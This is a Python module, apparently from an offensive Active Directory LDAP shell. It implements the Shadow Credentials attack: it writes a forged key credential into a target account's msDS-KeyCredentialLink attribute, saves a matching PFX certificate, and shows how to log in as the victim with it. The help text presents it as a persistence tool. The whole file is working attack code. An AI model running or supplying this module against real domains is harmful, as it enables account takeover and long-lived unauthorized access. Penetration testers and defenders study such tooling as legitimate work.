import logging
import random

import OpenSSL
from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
from dsinternals.common.data.DNWithBinary import DNWithBinary
from dsinternals.common.data.hello.KeyCredential import KeyCredential
from dsinternals.system.DateTime import DateTime
from dsinternals.system.Guid import Guid
from ldap3 import MODIFY_DELETE, MODIFY_REPLACE, Connection
from ldapdomaindump import domainDumper
from pydantic import BaseModel

from ldap_shell.ldap_modules.base_module import ArgumentType, BaseLdapModule, arg_field
from ldap_shell.utils.ldap_utils import LdapUtils


def _export_pfx(certificate, passphrase: bytes) -> bytes:
    """Build a PKCS#12 blob without the deprecated OpenSSL.crypto.PKCS12 API."""
    from cryptography.hazmat.primitives.serialization import (
        BestAvailableEncryption,
        load_pem_private_key,
        pkcs12,
    )
    from cryptography.x509 import load_pem_x509_certificate

    key_pem = OpenSSL.crypto.dump_privatekey(OpenSSL.crypto.FILETYPE_PEM, certificate.key)
    cert_pem = OpenSSL.crypto.dump_certificate(OpenSSL.crypto.FILETYPE_PEM, certificate.certificate)
    private_key = load_pem_private_key(key_pem, password=None)
    cert = load_pem_x509_certificate(cert_pem)
    return pkcs12.serialize_key_and_certificates(
        name=b'ldap_shell',
        key=private_key,
        cert=cert,
        cas=None,
        encryption_algorithm=BestAvailableEncryption(passphrase),
    )


def _device_id(raw) -> str:
    """Parse a DeviceID out of one msDS-KeyCredentialLink value."""
    key_cred = KeyCredential.fromDNWithBinary(DNWithBinary.fromRawDNWithBinary(raw))
    return key_cred.DeviceId.toFormatD()


class LdapShellModule(BaseLdapModule):
    """List, add or delete Shadow Credentials (msDS-KeyCredentialLink)."""

    help_text = "Persist or remove Shadow Credentials without immediately roasting the NT hash"
    examples_text = """
    `set_keycred john list`
    `set_keycred john add`
    `set_keycred john del 26d8713b-4a44-4792-82b7-2e30f5e33ab5`
    Inline: `ldap_shell domain.local/user:pass set_keycred john add`
    Then bind with the saved PFX:
    `ldap_shell domain.local/john -pfx john.pfx -pfx-pass '...' -dc-host dc.domain.local`
    """
    module_type = "Abuse ACL"

    class ModuleArgs(BaseModel):
        target: str = arg_field(
            description="Target user or computer",
            arg_type=[ArgumentType.USER, ArgumentType.COMPUTER],
        )
        action: str = arg_field(
            description="Action: list, add or del",
            arg_type=ArgumentType.ACTION,
        )
        device_id: str = arg_field(
            None,
            description="DeviceID to delete (del)",
            arg_type=ArgumentType.STRING,
        )

    def __init__(self, args_dict: dict, domain_dumper: domainDumper, client: Connection, log=None):
        self.args = self.ModuleArgs(**args_dict)
        self.domain_dumper = domain_dumper
        self.client = client
        self.log = log or logging.getLogger('ldap-shell.shell')

    def _require_tls(self) -> bool:
        if self.client.tls_started or self.client.server.ssl:
            return True
        self.log.info('Sending StartTLS command...')
        if not self.client.start_tls():
            self.log.error('StartTLS failed. Retry with -use-ldaps')
            return False
        self.log.info('StartTLS succeeded')
        return True

    def _current_values(self, target_dn):
        if not self.client.search(target_dn, '(objectClass=*)', attributes=['msDS-KeyCredentialLink']):
            self.log.error('Could not query msDS-KeyCredentialLink')
            return None
        raw = []
        if self.client.response:
            raw = list(self.client.response[0]['raw_attributes'].get('msDS-KeyCredentialLink', []) or [])
        return raw

    def _write(self, target_dn, values) -> bool:
        if values:
            changes = {'msDS-KeyCredentialLink': [(MODIFY_REPLACE, values)]}
        else:
            changes = {'msDS-KeyCredentialLink': [(MODIFY_DELETE, [])]}
        if not self.client.modify(target_dn, changes) or self.client.result.get('result', 1) != 0:
            self.log.error(f'Failed to update msDS-KeyCredentialLink: {self.client.result}')
            return False
        return True

    def __call__(self):
        target_dn = LdapUtils.resolve_dn(self.client, self.domain_dumper, self.args.target)
        if not target_dn:
            self.log.error(f'Target not found: {self.args.target}')
            return

        action = (self.args.action or '').lower()
        current = self._current_values(target_dn)
        if current is None:
            return

        if action == 'list':
            if not current:
                self.log.info(f'No KeyCredentials on {self.args.target}')
                return
            self.log.info(f'KeyCredentials on {self.args.target}:')
            for raw in current:
                try:
                    self.log.info(f'  {_device_id(raw)}')
                except Exception as exc:
                    self.log.info(f'  (unparsed: {exc})')
            return

        if not self._require_tls():
            return

        if action == 'add':
            certificate = X509Certificate2(
                subject=self.args.target, keySize=2048, notBefore=(-40 * 365), notAfter=(40 * 365),
            )
            device_id = Guid()
            key_credential = KeyCredential.fromX509Certificate2(
                certificate=certificate,
                deviceId=device_id,
                owner=self.domain_dumper.root,
                currentTime=DateTime(),
            )
            new_values = current + [key_credential.toDNWithBinary().toString()]
            if not self._write(target_dn, new_values):
                return
            pfx_pass = ''.join(chr(random.randint(1, 255)) for _ in range(20)).encode()
            pfxdata = _export_pfx(certificate, pfx_pass)
            pfx_path = f'{self.args.target}.pfx'
            try:
                with open(pfx_path, 'wb') as handle:
                    handle.write(pfxdata)
                self.log.info(f'Added DeviceID {device_id.toFormatD()}, saved PFX to {pfx_path}')
            except OSError as exc:
                self.log.warning(f'Added DeviceID {device_id.toFormatD()}, but could not save PFX: {exc}')
            return

        if action == 'del':
            if not self.args.device_id:
                self.log.error('device_id is required for del')
                return
            wanted = self.args.device_id.lower()
            kept = []
            removed = False
            for raw in current:
                try:
                    if _device_id(raw).lower() == wanted:
                        removed = True
                        continue
                except Exception:
                    pass
                kept.append(raw)
            if not removed:
                self.log.warning(f'DeviceID {self.args.device_id} not found')
                return
            if not self._write(target_dn, kept):
                return
            self.log.info(f'Removed DeviceID {self.args.device_id} from {self.args.target}')
            return

        self.log.error('Invalid action. Use list/add/del')
